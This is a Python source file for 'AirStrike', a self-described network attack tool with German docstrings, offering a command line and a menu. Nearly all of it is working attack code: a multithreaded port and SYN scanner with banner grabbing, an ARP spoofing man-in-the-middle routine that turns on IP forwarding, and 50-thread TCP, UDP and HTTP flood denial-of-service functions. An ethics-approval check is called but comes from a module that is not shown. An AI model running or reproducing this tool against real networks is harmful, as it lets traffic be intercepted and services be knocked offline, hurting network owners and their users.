"""
AirStrike - Advanced Network Attack & Penetration Tool
"""

import socket
import threading
import time
import random
import sys
from typing import List, Dict, Optional
from concurrent.futures import ThreadPoolExecutor
import scapy.all as scapy
from scapy.layers.inet import IP, TCP, UDP, ICMP
from scapy.layers.l2 import ARP, Ether
from core.blackops_logger import BlackOpsLogger
from core.ethics_enforcer import EthicsEnforcer

class AirStrike:
    def __init__(self):
        self.logger = BlackOpsLogger("AirStrike")
        self.ethics = EthicsEnforcer()
        self.is_attacking = False
        
    def port_scan(self, target: str, ports: List[int] = None, 
                  scan_type: str = "tcp") -> Dict[int, Dict]:
        """Führt Port-Scan durch"""
        if not self.ethics.get_approval(target, "port_scan", "Security assessment"):
            return {}
        
        self.logger.info(f"Starting {scan_type} scan on {target}")
        
        if ports is None:
            ports = list(range(1, 1025))  # Common ports
        
        results = {}
        
        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = []
            for port in ports:
                if scan_type == "tcp":
                    future = executor.submit(self._scan_tcp_port, target, port)
                elif scan_type == "udp":
                    future = executor.submit(self._scan_udp_port, target, port)
                else:
                    future = executor.submit(self._scan_syn_port, target, port)
                futures.append((port, future))
            
            for port, future in futures:
                try:
                    result = future.result(timeout=2)
                    if result:
                        results[port] = result
                        self.logger.info(f"Port {port}: {result['status']}")
                except:
                    pass
        
        return results
    
    def _scan_tcp_port(self, target: str, port: int) -> Optional[Dict]:
        """Scannt TCP Port"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((target, port))
            sock.close()
            
            if result == 0:
                # Try to get service banner
                service = self._get_service_banner(target, port)
                return {
                    'status': 'open',
                    'protocol': 'tcp',
                    'service': service
                }
            else:
                return None
        except:
            return None
    
    def _scan_udp_port(self, target: str, port: int) -> Optional[Dict]:
        """Scannt UDP Port"""
        try:
            # UDP scanning is less reliable
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(1)
            sock.sendto(b'\x00' * 64, (target, port))
            
            try:
                data, addr = sock.recvfrom(1024)
                return {
                    'status': 'open',
                    'protocol': 'udp',
                    'response': data[:100]  # First 100 bytes
                }
            except socket.timeout:
                # No response could mean open or filtered
                return {
                    'status': 'open|filtered',
                    'protocol': 'udp'
                }
        except:
            return None
    
    def _scan_syn_port(self, target: str, port: int) -> Optional[Dict]:
        """Scannt mit SYN Paketen"""
        try:
            # Create SYN packet
            packet = IP(dst=target)/TCP(dport=port, flags="S")
            response = scapy.sr1(packet, timeout=1, verbose=0)
            
            if response and response.haslayer(TCP):
                tcp_layer = response.getlayer(TCP)
                
                if tcp_layer.flags == 0x12:  # SYN-ACK
                    # Send RST to close connection
                    rst_packet = IP(dst=target)/TCP(dport=port, flags="R")
                    scapy.send(rst_packet, verbose=0)
                    
                    return {
                        'status': 'open',
                        'protocol': 'tcp',
                        'flags': 'SYN-ACK'
                    }
                elif tcp_layer.flags == 0x14:  # RST-ACK
                    return {
                        'status': 'closed',
                        'protocol': 'tcp',
                        'flags': 'RST-ACK'
                    }
        except:
            pass
        
        return None
    
    def _get_service_banner(self, target: str, port: int) -> str:
        """Holt Service Banner"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((target, port))
            
            # Send generic probe
            if port == 80 or port == 443:
                sock.send(b"GET / HTTP/1.0\r\n\r\n")
            elif port == 21:
                sock.send(b"USER anonymous\r\n")
            elif port == 22:
                sock.send(b"SSH-2.0-BlackOps\r\n")
            
            banner = sock.recv(1024).decode('utf-8', errors='ignore')
            sock.close()
            
            return banner[:500]  # Limit length
        except:
            return "Unknown"
    
    def arp_spoof(self, target_ip: str, gateway_ip: str, interface: str):
        """Führt ARP Spoofing Attacke durch"""
        if not self.ethics.get_approval(target_ip, "arp_spoof", "Network testing"):
            return
        
        self.logger.warning(f"Starting ARP spoofing attack on {target_ip}")
        self.is_attacking = True
        
        # Get MAC addresses
        target_mac = self._get_mac(target_ip)
        gateway_mac = self._get_mac(gateway_ip)
        
        if not target_mac or not gateway_mac:
            self.logger.error("Could not get MAC addresses")
            return
        
        # Start spoofing threads
        spoof_thread = threading.Thread(
            target=self._arp_spoof_loop,
            args=(target_ip, gateway_ip, target_mac, gateway_mac, interface)
        )
        spoof_thread.daemon = True
        spoof_thread.start()
        
        # Start packet forwarding
        forward_thread = threading.Thread(
            target=self._enable_ip_forwarding
        )
        forward_thread.daemon = True
        forward_thread.start()
        
        self.logger.info("ARP spoofing started. Press Ctrl+C to stop.")
        
        try:
            while self.is_attacking:
                time.sleep(1)
        except KeyboardInterrupt:
            self._restore_arp(target_ip, gateway_ip, target_mac, gateway_mac, interface)
            self.logger.info("ARP spoofing stopped")
    
    def _get_mac(self, ip: str) -> Optional[str]:
        """Holt MAC Adresse"""
        try:
            arp_request = ARP(pdst=ip)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            packet = broadcast/arp_request
            answered = scapy.srp(packet, timeout=2, verbose=False)[0]
            
            if answered:
                return answered[0][1].hwsrc
        except:
            pass
        
        return None
    
    def _arp_spoof_loop(self, target_ip: str, gateway_ip: str, 
                       target_mac: str, gateway_mac: str, interface: str):
        """ARP Spoofing Hauptschleife"""
        try:
            while self.is_attacking:
                # Spoof target
                target_packet = ARP(
                    op=2,  # ARP reply
                    pdst=target_ip,
                    hwdst=target_mac,
                    psrc=gateway_ip
                )
                scapy.send(target_packet, verbose=False)
                
                # Spoof gateway
                gateway_packet = ARP(
                    op=2,
                    pdst=gateway_ip,
                    hwdst=gateway_mac,
                    psrc=target_ip
                )
                scapy.send(gateway_packet, verbose=False)
                
                time.sleep(2)
        except Exception as e:
            self.logger.error(f"ARP spoof error: {e}")
    
    def _enable_ip_forwarding(self):
        """Aktiviert IP Forwarding"""
        import os
        
        try:
            # Linux
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                f.write('1')
            self.logger.info("IP forwarding enabled")
        except:
            self.logger.warning("Could not enable IP forwarding")
    
    def _restore_arp(self, target_ip: str, gateway_ip: str, 
                    target_mac: str, gateway_mac: str, interface: str):
        """Stellt ARP Tabellen wieder her"""
        try:
            # Restore target
            target_packet = ARP(
                op=2,
                pdst=target_ip,
                hwdst=target_mac,
                psrc=gateway_ip,
                hwsrc=gateway_mac
            )
            scapy.send(target_packet, count=5, verbose=False)
            
            # Restore gateway
            gateway_packet = ARP(
                op=2,
                pdst=gateway_ip,
                hwdst=gateway_mac,
                psrc=target_ip,
                hwsrc=target_mac
            )
            scapy.send(gateway_packet, count=5, verbose=False)
            
            # Disable IP forwarding
            import os
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                f.write('0')
            
        except Exception as e:
            self.logger.error(f"ARP restore error: {e}")
    
    def dos_attack(self, target: str, port: int, attack_type: str = "tcp"):
        """Führt DoS Attacke durch"""
        if not self.ethics.get_approval(target, "dos_attack", "Load testing"):
            return
        
        self.logger.warning(f"Starting {attack_type} DoS attack on {target}:{port}")
        self.is_attacking = True
        
        threads = []
        
        # Start multiple attack threads
        for i in range(50):  # 50 threads
            if attack_type == "tcp":
                thread = threading.Thread(
                    target=self._tcp_flood,
                    args=(target, port)
                )
            elif attack_type == "udp":
                thread = threading.Thread(
                    target=self._udp_flood,
                    args=(target, port)
                )
            else:  # http
                thread = threading.Thread(
                    target=self._http_flood,
                    args=(target, port)
                )
            
            thread.daemon = True
            thread.start()
            threads.append(thread)
        
        try:
            while self.is_attacking:
                time.sleep(1)
        except KeyboardInterrupt:
            self.is_attacking = False
            self.logger.info("DoS attack stopped")
    
    def _tcp_flood(self, target: str, port: int):
        """TCP Flood Attack"""
        while self.is_attacking:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((target, port))
                sock.send(b"X" * 1024)  # Send 1KB of data
                sock.close()
            except:
                pass
    
    def _udp_flood(self, target: str, port: int):
        """UDP Flood Attack"""
        while self.is_attacking:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(b"X" * 1024, (target, port))
                sock.close()
            except:
                pass
    
    def _http_flood(self, target: str, port: int):
        """HTTP Flood Attack"""
        import random
        
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        ]
        
        while self.is_attacking:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((target, port))
                
                # Send HTTP request
                request = f"""GET /{random.randint(1000, 9999)} HTTP/1.1\r
Host: {target}\r
User-Agent: {random.choice(user_agents)}\r
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r
Connection: keep-alive\r
\r
"""
                sock.send(request.encode())
                sock.recv(1024)  # Read response
                sock.close()
            except:
                pass
    
    def _run_interactive(self):
        """Interaktiver Menü-Modus für Aufruf aus dem Hauptmenü"""
        print("\n--- AIRSTRIKE ---")
        print("1. Port Scan")
        print("2. ARP Spoof")
        print("3. DoS Test")
        print("4. Back")

        choice = input("Select option: ").strip()
        if choice == "1":
            target = input("Target IP/Host: ").strip()
            if not target:
                return
            scan_type = input("Scan type (tcp/udp/syn) [tcp]: ").strip().lower() or "tcp"
            ports_raw = input("Ports (e.g. 80,443 or 1-100, leer=1-1024): ").strip()
            ports = None
            if ports_raw:
                try:
                    if "-" in ports_raw:
                        start, end = map(int, ports_raw.split("-", 1))
                        ports = list(range(start, end + 1))
                    else:
                        ports = [int(p.strip()) for p in ports_raw.split(",") if p.strip()]
                except ValueError:
                    print("Invalid port format.")
                    return
            results = self.port_scan(target, ports, scan_type if scan_type in ("tcp", "udp", "syn") else "tcp")
            print(f"\nScan Results for {target}:")
            print("-" * 50)
            for port, info in sorted(results.items()):
                print(f"Port {port}: {info['status']} ({info.get('service', 'Unknown')})")
        elif choice == "2":
            target = input("Target IP: ").strip()
            gateway = input("Gateway IP: ").strip()
            interface = input("Interface [eth0]: ").strip() or "eth0"
            if target and gateway:
                self.arp_spoof(target, gateway, interface)
        elif choice == "3":
            target = input("Target IP/Host: ").strip()
            port_raw = input("Target Port: ").strip()
            attack_type = input("Type (tcp/udp/http) [tcp]: ").strip().lower() or "tcp"
            if not target or not port_raw.isdigit():
                print("Invalid target or port.")
                return
            self.dos_attack(target, int(port_raw), attack_type if attack_type in ("tcp", "udp", "http") else "tcp")

    def run(self):
        """Hauptfunktion für CLI"""
        import argparse
        
        parser = argparse.ArgumentParser(description="AirStrike - Network Attack Tool")
        subparsers = parser.add_subparsers(dest='command', help='Command')
        
        # Port scan command
        scan_parser = subparsers.add_parser('scan', help='Port scanning')
        scan_parser.add_argument("target", help="Target IP or hostname")
        scan_parser.add_argument("-p", "--ports", help="Port range (e.g., 1-1000)")
        scan_parser.add_argument("-t", "--type", choices=['tcp', 'udp', 'syn'],
                               default='tcp', help="Scan type")
        
        # ARP spoof command
        arp_parser = subparsers.add_parser('arp', help='ARP spoofing')
        arp_parser.add_argument("target", help="Target IP")
        arp_parser.add_argument("gateway", help="Gateway IP")
        arp_parser.add_argument("-i", "--interface", default="eth0",
                              help="Network interface")
        
        # DoS command
        dos_parser = subparsers.add_parser('dos', help='DoS attack')
        dos_parser.add_argument("target", help="Target IP or hostname")
        dos_parser.add_argument("port", type=int, help="Target port")
        dos_parser.add_argument("-t", "--type", choices=['tcp', 'udp', 'http'],
                              default='tcp', help="Attack type")
        
        # Wenn kein bekannter Subcommand gesetzt ist, interaktiver Modus
        known_commands = {"scan", "arp", "dos"}
        if not any(arg in known_commands for arg in sys.argv[1:]):
            self.logger.print_banner()
            self._run_interactive()
            return

        args, _unknown = parser.parse_known_args()
        
        self.logger.print_banner()
        
        if args.command == 'scan':
            if args.ports:
                if '-' in args.ports:
                    start, end = map(int, args.ports.split('-'))
                    ports = list(range(start, end + 1))
                else:
                    ports = [int(p) for p in args.ports.split(',')]
            else:
                ports = None
            
            results = self.port_scan(args.target, ports, args.type)
            
            # Print results
            print(f"\nScan Results for {args.target}:")
            print("-" * 50)
            for port, info in sorted(results.items()):
                print(f"Port {port}: {info['status']} ({info.get('service', 'Unknown')})")
        
        elif args.command == 'arp':
            self.arp_spoof(args.target, args.gateway, args.interface)
        
        elif args.command == 'dos':
            self.dos_attack(args.target, args.port, args.type)

if __name__ == '__main__':
    AirStrike().run()
